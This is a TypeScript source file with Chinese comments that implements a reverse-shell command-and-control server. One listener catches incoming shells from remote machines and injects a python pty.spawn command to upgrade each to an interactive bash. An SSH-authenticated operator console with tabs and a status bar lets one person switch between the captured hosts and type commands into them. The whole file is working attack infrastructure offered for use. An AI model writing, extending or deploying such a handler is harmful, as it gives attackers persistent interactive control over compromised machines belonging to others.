import * as net from 'net';
import { timingSafeEqual } from 'crypto';
import { Server, Connection, utils, ParsedKey } from 'ssh2';
import * as fs from 'fs';
import * as path from 'path';
import { homedir } from 'os';

const PORT = 13335;
const SSH_PORT = 13336;

interface SSHConnectionState {
    stream: any;
    selectedConnection: net.Socket | null;
    commandMode: boolean;
}

// 存储所有活动的反向shell连接
const activeConnections = new Map<string, net.Socket>();
// 存储所有活动的SSH连接
const activeSSHConnections = new Map<Connection, SSHConnectionState>();

// 反向shell服务器
const reverseShellServer = net.createServer();

reverseShellServer.on('connection', (socket) => {
    const connectionId = `${socket.remoteAddress}:${socket.remotePort}`;
    console.log(`[+] New reverse shell connection from ${connectionId}`);
    activeConnections.set(connectionId, socket);

    // 发送创建PTY的命令，设置初始终端大小
    const ptyCommand = 'python3 -c "import pty, os, termios; pty.spawn(\'/bin/bash\'); os.system(\'stty rows 24 cols 80\')"';
    socket.write(ptyCommand + '\n');

    // Handle incoming data from the client
    socket.on('data', (data) => {
        // 将数据转发给所有选中的SSH连接
        activeSSHConnections.forEach((sshConn) => {
            if (sshConn.selectedConnection === socket) {
                sshConn.stream?.write(data);
            }
        });
    });

    // Handle client disconnection
    socket.on('close', () => {
        console.log(`[-] Reverse shell connection closed from ${connectionId}`);
        activeConnections.delete(connectionId);
    });

    // Handle errors
    socket.on('error', (err) => {
        console.error(`[!] Socket error: ${err.message}`);
        activeConnections.delete(connectionId);
    });
});

reverseShellServer.listen(PORT, () => {
    console.log(`[*] Reverse shell server listening on port ${PORT}`);
    console.log('[*] Waiting for reverse shell connections...');
});

// 生成SSH密钥对（如果不存在）
const keyPath = path.join(__dirname, 'ssh_keys');
if (!fs.existsSync(keyPath)) fs.mkdirSync(keyPath);

const privateKeyPath = path.join(keyPath, 'id_rsa');
const publicKeyPath = path.join(keyPath, 'id_rsa.pub');

if (!fs.existsSync(privateKeyPath)) {
    const { execSync } = require('child_process');
    execSync(`ssh-keygen -t rsa -b 4096 -f ${privateKeyPath} -N ""`);
}

const authorizedKeys = fs.readFileSync(path.join(homedir(), '.ssh', 'authorized_keys'), 'utf-8').split('\n').filter(i => i.trim());
const allowedPubKeys = authorizedKeys.map(i => utils.parseKey(i + '\n')).filter(i => i && !(i instanceof Error)) as ParsedKey[];
console.log(allowedPubKeys.length + ' keys loaded');

const eq = (a: Buffer, b: Buffer) => {
    if (a.length !== b.length) return false;
    return timingSafeEqual(a, b);
}

// SSH管理服务器
const sshServer = new Server({
    hostKeys: [fs.readFileSync(privateKeyPath)],
}, (client) => {
    const clientInfo = `SSH client`;
    console.log(`[+] New admin connection from ${clientInfo}`);

    // 初始化SSH连接状态
    const state: SSHConnectionState = { stream: null, selectedConnection: null, commandMode: false };
    activeSSHConnections.set(client, state);

    client.on('authentication', (ctx) => {
        if (!eq(Buffer.from(ctx.username), Buffer.from('user')))
            return ctx.reject();
        switch (ctx.method) {
            case 'password':
                return ctx.reject();
            case 'publickey':
                for (const allowedPubKey of allowedPubKeys) {
                    if (ctx.key.algo == allowedPubKey.type
                        && eq(ctx.key.data, allowedPubKey.getPublicSSH())
                        && (!ctx.signature || allowedPubKey.verify(ctx.blob!, ctx.signature, ctx.hashAlgo))) {
                        return ctx.accept();
                    }
                }
                return ctx.reject();
            default:
                return ctx.reject();
        }
    });

    client.on('ready', () => {
        client.on('session', (accept, reject) => {
            const session = accept();

            // 先处理PTY请求
            session.on('pty', (accept, reject, info) => {
                accept();
            });

            // 处理窗口大小变化
            session.on('window-change', (accept, reject, info) => {
                accept?.();
                // 将新的窗口大小发送给被控端，为状态栏预留一行
                const selectedConnection = activeSSHConnections.get(client)?.selectedConnection;
                if (selectedConnection) {
                    selectedConnection.write(`stty rows ${info.rows - 1} cols ${info.cols}\n`);
                }
            });

            session.on('shell', (accept, reject) => {
                const stream = accept();
                const sshConn = activeSSHConnections.get(client);
                if (sshConn) {
                    sshConn.stream = stream;
                }
                console.log('[*] Admin shell session started');

                // 渲染标签页
                const renderTabs = () => {
                    // 保存当前光标位置
                    stream.write('\x1b[s');
                    // 移动光标到状态栏上方
                    stream.write('\x1b[23;0H');
                    // 清除当前行
                    stream.write('\x1b[2K');
                    // 设置标签页样式
                    stream.write('\x1b[1;34m'); // 蓝色加粗

                    let tabLine = '';
                    let index = 1;
                    activeConnections.forEach((socket, id) => {
                        const isActive = socket === state.selectedConnection;
                        // 设置标签页背景色
                        stream.write(isActive ? '\x1b[44;37m' : '\x1b[40;37m');
                        // 添加标签页
                        tabLine += ` ${index}:${id} `;
                        index++;
                    });

                    // 填充剩余空间
                    const padding = ' '.repeat(80 - tabLine.length);
                    stream.write(tabLine + padding);

                    // 重置颜色
                    stream.write('\x1b[0m');
                    // 恢复光标位置
                    stream.write('\x1b[u');
                };

                // 更新状态栏
                const updateStatusBar = () => {
                    const status = state.selectedConnection
                        ? `[Connected to: ${state.selectedConnection.remoteAddress}:${state.selectedConnection.remotePort}]`
                        : '[Command Mode]';
                    // 保存当前光标位置
                    stream.write('\x1b[s');
                    // 移动光标到状态栏位置
                    stream.write('\x1b[24;0H');
                    // 清除当前行
                    stream.write('\x1b[2K');
                    // 设置背景色和前景色
                    stream.write('\x1b[44;37m');
                    // 写入状态信息
                    stream.write(status.padEnd(80));
                    // 重置颜色
                    stream.write('\x1b[0m');
                    // 恢复光标位置
                    stream.write('\x1b[u');
                };

                // 切换到命令模式
                const switchToCommandMode = () => {
                    if (!state.selectedConnection) return;
                    state.selectedConnection = null;
                    state.commandMode = true;
                    stream.write('\r\nCommand mode - Press number to switch tab, q to quit\r\n');
                    renderTabs();
                    updateStatusBar();
                };

                // 通过数字选择连接
                const selectConnectionByNumber = (num: number) => {
                    const connections = Array.from(activeConnections.entries());
                    if (num > 0 && num <= connections.length) {
                        const [id, socket] = connections[num - 1];
                        state.selectedConnection = socket;
                        stream.write(`\r\nSelected connection: ${id}\r\n`);
                        renderTabs();
                        updateStatusBar();
                    } else {
                        stream.write('\r\nInvalid connection number\r\n');
                    }
                };

                // 清屏并设置初始状态
                stream.write('\x1b[2J\x1b[H');
                stream.write('Command mode - Press number to switch tab, q to quit\r\n');
                renderTabs();
                updateStatusBar();

                stream.on('data', (data) => {
                    const input = data.toString();
                    if (data[0] === 2) {
                        if (!state.commandMode) {
                            switchToCommandMode();
                            return;
                        } else {
                            state.commandMode = false;
                        }
                    }
                    if (state.selectedConnection) {
                        state.selectedConnection.write(data);
                    } else {
                        const char = input[0];
                        if (char === 'q' || char === 'd') {
                            stream.end();
                        } else {
                            const num = parseInt(char);
                            if (!isNaN(num)) selectConnectionByNumber(num);
                        }
                    }
                });

                // 处理会话结束
                stream.on('close', () => {
                    const sshConn = activeSSHConnections.get(client);
                    if (sshConn) {
                        sshConn.stream = null;
                        sshConn.selectedConnection = null;
                    }
                    console.log('[-] Admin shell session closed');
                });
            });
        });
    });

    client.on('end', () => {
        activeSSHConnections.delete(client);
        console.log(`[-] Admin connection closed from ${clientInfo}`);
    });
});

// 启动SSH服务器
sshServer.listen(SSH_PORT, '0.0.0.0', () => {
    console.log(`[*] SSH management server listening on port ${SSH_PORT}`);
    console.log('[*] Waiting for admin connections...');
    console.log(`[*] Public key for admin connection: ${fs.readFileSync(publicKeyPath, 'utf8')}`);
});
